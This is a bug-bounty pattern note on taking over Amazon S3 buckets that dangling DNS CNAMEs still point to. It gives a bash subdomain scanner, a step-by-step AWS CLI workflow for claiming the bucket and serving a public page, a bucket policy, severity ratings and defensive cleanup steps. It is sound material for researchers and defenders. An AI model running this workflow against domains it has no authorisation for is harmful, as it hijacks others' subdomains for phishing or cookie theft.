---
type: pattern
title: "Amazon S3 Bucket Takeover (Dangling CNAME → Unclaimed Bucket)"
vuln_class: subdomain-takeover
status: active
last_updated: 2026-04-11
sources:
  - https://medium.com/@bhautikXploit/the-way-i-found-amazon-s3-bucket-takeover-74f9001deb91
tags:
  - bb-pattern
---

# Pattern — Amazon S3 Bucket Takeover (Dangling CNAME → Unclaimed Bucket)

> When `*.example.com`'s DNS CNAME points to an S3 bucket that has since been deleted, anyone can create a bucket with the same name and serve arbitrary content from it. This is a "first come, first served" vulnerability.

## Core Identification

1. **CNAME → S3**: `*.s3.amazonaws.com` / `*.s3-website-{region}.amazonaws.com`
2. **HTTP response returns "NoSuchBucket"**:
   ```
   HTTP/1.1 404
   <Code>NoSuchBucket</Code>
   <Message>The specified bucket does not exist</Message>
   ```
3. **This error message is the confirmation signal for an unclaimed bucket** (the bucket was deleted but the DNS record was never cleaned up)

## Scanning Command

```bash
# Batch-scan a subdomain list
for sub in $(cat subdomains.txt); do
  cname=$(curl -s "https://dns.google/resolve?name=$sub&type=CNAME" \
    | jq -r '.Answer[]?.data')
  if [[ "$cname" == *s3* ]]; then
    body=$(curl -s "http://$sub/")
    if echo "$body" | grep -q "NoSuchBucket"; then
      echo "UNCLAIMED S3: $sub → $cname"
    fi
  fi
done
```

## Verification + PoC (strongly recommended before reporting)

> **Always claim the bucket before reporting.** The vendor may claim the bucket first during triage and call your report "already fixed," invalidating it.

```bash
# Step 1: Confirm NoSuchBucket
curl -si "http://target.example.com/" | grep "NoSuchBucket"

# Step 2: Confirm the bucket name the CNAME points to
# Usually the bucket name matches the subdomain itself (e.g. assets.example.com → bucket name assets.example.com)
curl -s "https://dns.google/resolve?name=target.example.com&type=CNAME"

# Step 3: Create a bucket with the same name (AWS CLI)
aws s3 mb s3://target.example.com --region us-east-1

# Step 4: Upload a PoC HTML page (containing only researcher info, no malicious content)
cat > poc.html << 'EOF'
<html><body>
<h1>Security Research PoC</h1>
<p>This S3 bucket was unclaimed. Found by: [your_handle] on [date].</p>
<p>This is a proof-of-concept for a bug bounty report. No malicious content.</p>
</body></html>
EOF
aws s3 cp poc.html s3://target.example.com/

# Step 5: Enable public access
aws s3api put-bucket-acl --bucket target.example.com --acl public-read
aws s3api put-public-access-block \
  --bucket target.example.com \
  --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false"

# Step 6: Enable static hosting
aws s3 website s3://target.example.com --index-document poc.html

# Step 7: Screenshot http://target.example.com/poc.html showing your content live
```

## Bucket Policy (make the file publicly readable)

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::target.example.com/*"
  }]
}
```

```bash
aws s3api put-bucket-policy --bucket target.example.com --policy file://policy.json
```

## Different S3 URL Formats

| Format | Example |
|--------|---------|
| Path-style | `http://s3.amazonaws.com/bucket-name/` |
| Virtual-hosted | `http://bucket-name.s3.amazonaws.com/` |
| Website endpoint | `http://bucket-name.s3-website-us-east-1.amazonaws.com/` |
| Custom domain via CNAME | `http://assets.example.com/` → CNAME → bucket |

## Other Error Signals

| Error | Meaning |
|------|------|
| `NoSuchBucket` | Bucket deleted, CNAME still present → **claimable** |
| `AccessDenied` | Bucket exists but is private → **already claimed, not a bug** |
| `403 Forbidden` | Same as above |
| `301 redirect` | Bucket is in another region → follow the redirect |

## Bugcrowd VRT Severity

- **Subdomain Takeover → P2 Default**
- If the subdomain shares an auth cookie scope (`*.example.com` cookie) → P1 candidate
- If the subdomain is a CDN / static asset host → P2

## Tools

| Tool | URL | Purpose |
|------|-----|---------|
| **subzy** | https://github.com/PentestPad/subzy | automated S3-aware subdomain takeover scanning |
| **nuclei** | https://github.com/projectdiscovery/nuclei | takeover templates |
| **aws-cli** | https://aws.amazon.com/cli/ | claiming the bucket |
| **s3scanner** | https://github.com/sa7mon/S3Scanner | scanning for public S3 buckets |

## Defense

1. **Immediately**: delete the dangling DNS CNAME record
2. **At the same time**: confirm the S3 bucket has been deleted, or re-created and set private
3. **Long-term**: infrastructure teardown checklists must include a DNS cleanup step

## Related

- [[Pattern - Subdomain Takeover Fastly]] — same dangling-CNAME concept, different provider
- https://github.com/EdOverflow/can-i-take-over-xyz — comprehensive S3 + CDN takeover guide
- Bhautik Patel, Bugcrowd (2026-03-30) disclosed write-up — thinner narrative than this pattern; this document adds the full CLI/policy/verification workflow

## Session-Mined Additions (2026-06-04)

- **Content-based ownership verification**: a LISTABLE bucket does not necessarily belong to the target. You must confirm the bucket's content (path structure, file naming) matches the target's business logic before attributing it as the target's bucket.
- **Timing**: a subdomain takeover must be claimed before reporting (`aws s3 mb s3://bucket-name`) and released immediately after reporting — never report before claiming.
